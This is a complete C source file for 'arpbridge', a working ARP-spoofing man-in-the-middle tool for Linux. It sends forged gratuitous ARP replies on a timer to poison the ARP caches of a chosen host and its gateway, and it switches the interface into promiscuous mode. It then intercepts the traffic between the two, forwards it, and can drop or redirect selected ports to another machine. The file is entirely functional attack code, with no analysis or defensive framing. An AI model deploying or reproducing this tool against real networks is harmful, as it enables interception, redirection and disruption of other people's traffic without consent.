#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/sockios.h>
#include <netinet/in.h>

/* Our network-socket */
int sock = -1;
uint8_t promisc = 0;
struct sockaddr_ll sa;

uint8_t virtualMac [6] = { 2, 0, 0, 0, 0, 0 };
uint8_t remoteMac [6]  = { 0, 0, 0, 0, 0, 0 };
uint8_t gatewayMac [6] = { 0, 0, 0, 0, 0, 0 };
uint8_t remoteIP [4]   = { 0, 0, 0, 0 };
uint8_t gatewayIP [4]  = { 0, 0, 0, 0 };
char *interface        = "eth0";

// {{{ sendPacket
/**
 * Write out a raw ethernet-frame to socket
 * 
 * @param char *packet
 * @param size_t length
 * 
 * @access public
 * @return void
 **/
#define sendPacket(packet, length) \
  if (sendto (sock, packet, length, 0, (struct sockaddr *)&sa, sizeof (sa)) == -1) \
    perror ("sendto");
// }}}

// {{{ sendGARP
/**
 * Write out a gratious ARP-Reply
 * 
 * @param char *fromMAC
 * @param char *toMAC
 * @param uint32_t fromIP
 * @param uint32_t toIP
 * 
 * @access public
 * @return void
 **/
void sendGARP (uint8_t *fromMAC, uint8_t *toMAC, uint8_t *fromIP, uint8_t *toIP) {
  char packet [42] =
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x08\x06\x00\x01\x08\x00"
    "\x06\x04\x00\x02\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00";
  
  char *p = (char *)&packet;
  
  // Change ethernet-header
  memcpy (p, toMAC, 6);
  memcpy (p + 6, fromMAC, 6);
  
  // Change ARP-Addresses
  memcpy (p + 22, fromMAC, 6);
  memcpy (p + 28, fromIP, 4);
  memcpy (p + 32, toMAC, 6);
  memcpy (p + 38, toIP, 4);
  
  // Send out the packet
  sendPacket (packet, 42);
}
// }}}

// {{{ renew
/**
 * Singal-Handler: Resend our gratious ARP
 * 
 * @param int sig (unused)
 * 
 * @access public
 * @return void
 **/
void renew (int sig) {
  // Tell gateway and remote about us
  sendGARP (virtualMac, remoteMac, gatewayIP, remoteIP);
  sendGARP (virtualMac, gatewayMac, remoteIP, gatewayIP);
  
  // Do it again in future
  alarm (5);
}
// }}}

// {{{ cleanup
/**
 * Signal-Handler: Clean up and exit
 * 
 * @param int sig (unused)
 * 
 * @access public
 * @return void
 **/
void cleanup (int sig) {
  // Restore all ARP-Bindings
  sendGARP (gatewayMac, remoteMac, gatewayIP, remoteIP);
  sendGARP (remoteMac, gatewayMac, remoteIP, gatewayIP);
  
  // Remove promiscous mode
  if (!promisc) {
    struct ifreq ifr;
    
    if (ioctl (sock, SIOCGIFFLAGS, &ifr) == - 1)
      exit (0);
    
    ifr.ifr_flags &= ~IFF_PROMISC;
    
    ioctl (sock, SIOCSIFFLAGS, &ifr);
  }
  
  // Do a clean exit
  exit (0);
}
// }}}

// {{{ usage
/**
 * Print usage and exit
 * 
 * @access public
 * @return void
 **/
void usage () {
  fprintf (stderr, "Usage: arpbridge [-h] [-d] [-i interface] [-l|-b bridge-mac] [-r [mac]] [-p port] remote-mac gateway-mac remote-ip gateway-ip\n\n");
  fprintf (stderr, "  -h             Print this information\n");
  fprintf (stderr, "  -d             Don't forward incoming traffic\n");
  fprintf (stderr, "  -r [mac]       Don't drop traffic, but forward to local (or specified) mac\n");
  fprintf (stderr, "  -p port        Don't forward traffic for a given port (logic inverted when used with -d)\n");
  fprintf (stderr, "  -i interface   Listen on this interface\n");
  fprintf (stderr, "  -l             Use MAC-Address of our interface as middle\n");
  fprintf (stderr, "  -b mac         Use this MAC-Address as middle\n");
  fprintf (stderr, "\n");
  
  exit (1);
}
// }}}

// {{{ getMAC
/**
 * Read a MAC-address from human input
 * 
 * @param uint8_t *dest
 * @param char *src
 * 
 * @access public
 * @return void
 **/
void getMAC (uint8_t *dest, char *src) {
  if (sscanf (src, "%02hx:%02hx:%02hx:%02hx:%02hx:%02hx", dest, dest + 1, dest + 2, dest + 3, dest + 4, dest + 5) == 6)
    return;
  
  fprintf (stderr, "Invalid MAC: %s\n", src);
  exit (1);
}
// }}}

// {{{ getIP
/**
 * Read an IP-address from human input
 * 
 * @param uint8_t *ip
 * @param char *src
 * 
 * @access public
 * @return void
 **/
void getIP (uint8_t *ip, char *src) {
  if (sscanf (src, "%hu.%hu.%hu.%hu", ip, ip + 1, ip + 2, ip + 3) == 4)
    return;
  
  fprintf (stderr, "Invalid IP: %s\n", src);
  exit (1);
}
// }}}

// {{{ main
/**
 * Main-Program
 * 
 * @access public
 * @return int
 **/
int main (int argc, char *argv[]) {
  int c;
  uint8_t autoMac = 0;
  uint8_t autoForward = 1;
  uint8_t autoRedirect = 0;
  uint16_t filterPortSize = 0;
  uint16_t *filterPorts = 0;
  uint8_t localMac [6];
  fd_set rfds;
  struct timeval tv;
  struct ifreq ifr;
  struct sockaddr_ll ss;
  
  // Parse arguments
  c = rand_r (&c);
  memcpy (virtualMac + 2, &c, 4);
  
  while ((c = getopt (argc, argv, "b:di:hlp:r::?VVVV")) != -1) {
    switch (c) {
      case 'b':
        getMAC (virtualMac, optarg);
        break;
      case 'd':
        autoForward = 0;
        break;
      case 'i':
        interface = strdup (optarg);
        break;
      case 'l':
        autoMac = 1;
        break;
      case 'p':
        if ((filterPorts = (uint16_t *)realloc (filterPorts, sizeof (uint16_t) * ++filterPortSize)) == 0) {
          perror ("Failed to allocate memory");
          exit (1);
        }
        
        filterPorts [filterPortSize - 1] = atoi (optarg);
        
        break;
      case 'r':
        if (optarg) {
          autoRedirect = 2;
          getMAC (localMac, optarg);
        } else
          autoRedirect = 1;
        
        break;
      case 'h':
      default:
        usage ();
    }
  }
  
  argc -= optind;
  argv += optind;
  
  if (argc != 4)
    usage ();
  
  getMAC (remoteMac, argv [0]);
  getMAC (gatewayMac, argv [1]);
  getIP ((uint8_t *)&remoteIP, argv [2]);
  getIP ((uint8_t *)&gatewayIP, argv [3]);
  
  // Prepare the I/O
  memset (&sa, 0, sizeof (sa));
  sa.sll_family    = AF_PACKET;
  sa.sll_protocol  = htons (ETH_P_ALL);
  
  // Create listener
  if ((sock = socket (AF_PACKET, SOCK_RAW, sa.sll_protocol)) < 0) {
    perror ("socket");
    
    return errno;
  }
  
  // Retrive index of our interface
  memset ((void *)&ifr, 0, sizeof (ifr));
  strncpy (ifr.ifr_name, interface, strlen (interface));
  
  if (ioctl (sock, SIOCGIFINDEX, &ifr) < 0) {
    perror ("get ifindex");
    exit (1);
  }
  
  sa.sll_ifindex = ifr.ifr_ifindex;
  
  // Check type of interface
  if (ioctl (sock, SIOCGIFHWADDR, &ifr) == -1) {
    perror ("get ifmac");
    
    exit (1);
  }
  
  if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
    fprintf (stderr, "Interface must be of type ethernet\n");
    exit (1);
  }
  
  if (autoRedirect != 2)
    memcpy (localMac, ifr.ifr_hwaddr.sa_data, 6);
  
  // Use MAC of interface if requested or check if that mac is being used
  if (autoMac)
    memcpy (virtualMac, ifr.ifr_hwaddr.sa_data, 6);
  else if (memcmp (virtualMac, ifr.ifr_hwaddr.sa_data, 6) == 0)
    autoMac = 1;
  
  if (!autoForward && !filterPortSize)
    fprintf (stderr, "WARNING: Not forwarding traffic between entities!\n");
  
  if (autoMac)
    fprintf (stderr, "WARNING: Using MAC of our own interface. USE WITH CAUTION AND ONLY IF YOU REALLY KNOW WHAT YOU ARE DOING!\n");
  
  if ((!autoForward && !filterPortSize) || autoMac)
    fprintf (stderr, "\n");
  
  // Put device into promiscous mode
  if (ioctl(sock, SIOCGIFFLAGS, &ifr) == - 1) {
    perror ("Get interface flags");
    
    exit (1);
  }
  
  if ((ifr.ifr_flags & IFF_PROMISC) == 0) {
    ifr.ifr_flags |= IFF_PROMISC;
    
    if (ioctl (sock, SIOCSIFFLAGS, &ifr) == -1) {
      perror ("Set promiscous mode");
      
      exit (1);
    }
  } else
    promisc = 1;
  
  // Do some informal output
  fprintf (stderr, "Interface:   %s (Index %u)\n", interface, sa.sll_ifindex);
  fprintf (stderr, "Remote MAC:  %02x:%02x:%02x:%02x:%02x:%02x\n", remoteMac [0], remoteMac [1], remoteMac [2], remoteMac [3], remoteMac [4], remoteMac [5]);
  fprintf (stderr, "Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", gatewayMac [0], gatewayMac [1], gatewayMac [2], gatewayMac [3], gatewayMac [4], gatewayMac [5]);
  fprintf (stderr, "Virtual MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", virtualMac [0], virtualMac [1], virtualMac [2], virtualMac [3], virtualMac [4], virtualMac [5]);
  fprintf (stderr, "Remote IP:   %u.%u.%u.%u\n", remoteIP [0], remoteIP [1], remoteIP [2], remoteIP [3]);
  fprintf (stderr, "Gateway IP:  %u.%u.%u.%u\n", gatewayIP [0], gatewayIP [1], gatewayIP [2], gatewayIP [3]);
  
  // Setup signal-handlers
  signal (SIGALRM, renew);
  signal (SIGHUP, cleanup);
  signal (SIGINT, cleanup);
  signal (SIGTERM, cleanup);
  
  // Make sure ARP-Cache is flushed
  renew (SIGALRM);
  
  // Main-loop
  for (;;) {
    // Wait for incoming packet
    FD_ZERO (&rfds);
    FD_SET (sock, &rfds);
    
    tv.tv_sec = 60;
    tv.tv_usec = 0;
    
    if (select (sock + 1, &rfds, NULL, NULL, &tv) < 1)
      continue;
    
    if (!FD_ISSET (sock, &rfds))
      continue;
    
    // Read the packet
    uint8_t buf[1501];
    size_t length;
    socklen_t slen = sizeof (ss);
    
    if ((length = recvfrom (sock, &buf, sizeof (buf), 0, (struct sockaddr *)&ss, &slen)) == -1) {
      perror ("read");
      
      continue;
    } else if (length == 0) {
      fprintf (stderr, "Socket was closed, goodbye!\n");
      cleanup (SIGTERM);
    } else if (length < 14) {
      fprintf (stderr, "Short read\n");
      
      continue;
    }
    
    // Check whether to capture traffic
    if (ss.sll_ifindex != sa.sll_ifindex)
      continue;
    
    uint8_t *to = (uint8_t *)buf;
    uint8_t *from = to + 6;
    
    if ((!autoForward && !filterPortSize && !autoRedirect) || (memcmp (to, virtualMac, 6) != 0))
      continue;
    
    uint8_t fromGateway = (memcmp (from, gatewayMac, 6) == 0);
    
    // Check destination-ip if using local MAC
    if (autoMac && (buf [12] == 0x08) && (buf [13] == 0x00) && (length > 33)) {
      /* uint8_t *src = to + 26; */
      uint8_t *dst = to + 30;
      
      // Skip traffic from gateway not originating remote ip
      if (fromGateway && (memcmp (dst, remoteIP, 4) != 0))
        continue;
    }
    
    // Check wheter to filter the port
    // TODO: This is only IPv4 at the moment
    // TODO: Distinguish between TCP/UDP (buf [23] == 0x06 / buf [23] == 0x11)
    if (filterPortSize && (buf [12] == 0x08) && (buf [13] == 0x00) && (length > 33)) {
      uint8_t *hdr = to + 14 + ((buf [14] & 0x0F) * 4);
      uint16_t sport = (hdr [0] << 8) | hdr [1];
      uint16_t dport = (hdr [2] << 8) | hdr [3];
      uint16_t off;
      
      for (off = 0; off < filterPortSize; off++)
        if ((filterPorts [off] == sport) || (filterPorts [off] == dport)) {
          off = 0;
          
          break;
        }
      
      if ((autoForward && !off) || (!autoForward && off)) {
        if (!autoRedirect)
          continue;
        
        // Rewrite
        memcpy (from, virtualMac, 6);
        memcpy (to, localMac, 6);
        
        // Forward
        sendPacket (buf, length);
        
        continue;
      }
    }
    
    // Capture traffic gateway->remote
    if (fromGateway) {
      // Rewrite
      memcpy (from, virtualMac, 6);
      memcpy (to, remoteMac, 6);
      
      // Forward
      sendPacket (buf, length);
    // Capture traffic remote->gateway
    } else if (memcmp (from, remoteMac, 6) == 0) {
      // Rewrite
      memcpy (from, virtualMac, 6);
      memcpy (to, gatewayMac, 6);
      
      // Forward
      sendPacket (buf, length);
    // Capture traffic local->virtual
    } else if ((memcmp (from, localMac, 6) == 0) && (memcmp (to, virtualMac, 6) == 0)) {
      // Rewrite
      memcpy (from, virtualMac, 6);
      memcpy (to, remoteMac, 6);
      
      // Forward
      sendPacket (buf, length);
    }
  }
  
  return 0;
}
// }}}
